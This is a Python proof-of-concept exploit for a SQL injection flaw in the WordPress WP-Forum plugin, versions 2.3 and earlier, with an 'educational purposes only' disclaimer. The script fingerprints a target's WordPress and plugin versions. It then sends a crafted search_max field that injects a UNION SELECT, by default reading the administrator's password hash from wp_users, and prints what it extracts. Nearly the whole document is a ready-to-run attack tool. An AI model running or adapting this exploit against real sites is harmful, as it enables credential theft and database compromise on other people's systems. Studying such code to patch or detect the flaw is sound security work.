#!/usr/bin/env python

# WP-Forum <= 2.3 SQLi exploit
# Steve Coward (steve@sugarstack.io)
# Based on similar PoC from Juan Galiana Lara (http://www.securityfocus.com/bid/37357)
#
# FOR EDUCATIONAL PURPOSES ONLY!
# The information contained within this advisory is supplied "as-is"
# with no warranties or guarantees of fitness of use or otherwise.
# I (Steve Coward) accept no responsibility for any damage
# caused by the use or misuse of this information.

import click
import requests
import re
import sys
from distutils.version import StrictVersion

min_wordpress_version = '2.0'
min_wp_forum_version = '2.3'

def is_exploitable(url):
    response = requests.get(url)
    wordpress_pattern = re.compile(r'WordPress\s(.+)\"')
    wp_forum_plugin_pattern = re.compile(r'Version: (.+)<br />')

    wordpress_compatible, wp_forum_compatible = False, False

    wordpress_matches = wordpress_pattern.findall(response.text)
    wp_forum_matches = wp_forum_plugin_pattern.findall(response.text)

    if len(wordpress_matches) > 0:
        wordpress_compatible = StrictVersion(wordpress_matches[0]) >= StrictVersion(min_wordpress_version)
    if len(wp_forum_matches) > 0:
        wp_forum_compatible = StrictVersion(wp_forum_matches[0]) <= StrictVersion(min_wp_forum_version)

    if not wordpress_compatible:
        click.echo('WordPress version is incompatible! (requires WordPress %s+)' % min_wordpress_version)
    if not wp_forum_compatible:
        click.echo('WP-Forum plugin version is incompatible! (requires WP-Forum <= %s)' % min_wp_forum_version)

    return wordpress_compatible and wp_forum_compatible


def build_url_request(url, path, post):
    return 'http://%s/%s/?p=%s&wpforumaction=search' % (url, path, post) if 'http' not in url else '%s/%s/?p=%s&wpforumaction=search' % (url, path, post)

@click.command()
@click.option('--url', help='Target URL.')
@click.option('--wp-path', default='wp', help='Path to target Wordpress instance.')
@click.option('--post-id', default=1, help='Post id to use against target Wordpress instance.')
@click.option('--payload', default='union select 1,1,1,user_pass,1,1,1 from wp_users where id=1', help='SQLi code to execute on target.')
def send_evil_request(url, wp_path, post_id, payload):
    search_pattern = re.compile(r'viewtopic.+>([$].+)<')
    target_url = build_url_request(url, wp_path, post_id)
    post_fields = {
        'search_words': 'any',
        'search_user': '*',
        'search_min': '0',
        'search_max': '999 DAY) %s or SUBDATE(CURDATE(), INTERVAL 9999' % payload,
        'check_all': 'on',
        'search_submit': 'Start+Search'
    }

    compatibility_check = is_exploitable(target_url)
    if not compatibility_check:
        sys.exit(0)

    response = requests.post(target_url, data=post_fields)
    matches = re.search(search_pattern, response.text)

    if matches:
        click.echo('Success!')
        click.echo('Result:\t%s' % matches.group(1))
    else:
        click.echo('No results found, try another SQLi test.')

if __name__ == '__main__':
    send_evil_request()
